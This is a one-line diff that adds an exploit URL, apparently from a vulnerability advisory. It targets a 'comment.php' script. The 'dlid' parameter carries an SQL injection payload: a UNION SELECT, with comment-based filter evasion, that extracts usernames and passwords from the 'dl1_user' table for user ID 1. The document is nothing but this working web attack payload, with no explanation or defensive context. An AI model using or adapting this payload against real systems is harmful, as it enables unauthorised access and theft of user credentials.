@@ -1,0 +1,1 @@
+http://www.example.com/[path]/comment.php?dlid=&#039;/**/union/**/select/**/0,0,userpassword,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/from/**/dl1_user/**/where/**/userid=1/*
